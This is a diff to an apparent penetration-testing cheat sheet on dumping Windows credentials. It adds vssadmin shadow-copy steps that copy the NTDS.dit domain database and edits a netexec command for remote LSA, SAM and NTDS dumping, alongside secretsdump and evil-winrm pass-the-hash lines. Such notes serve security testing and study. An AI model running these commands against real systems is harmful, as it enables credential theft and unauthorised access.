@@ -93,6 +93,15 @@ impacket-secretsdump -system system.save -sam sam.save -ntds ntds.dit local
 Administrator:500:NT:LM:::
 evil-winrm --hash LM -i 10.10.10.10 --user Administrator
 ```
+
+Other solution to shadow copy:
+
+```
+vssadmin CREATE SHADOW /For=C:
+    ...
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
  
 ## When system
 
@@ -112,7 +121,7 @@ Dumping LSA/SAM remotely:
 ```
 > netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --lsa
 > netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --sam
-> netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --ntdsutil
+> netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --M ntdsutil
 ```
 
 Extracting hash from LSASS memory
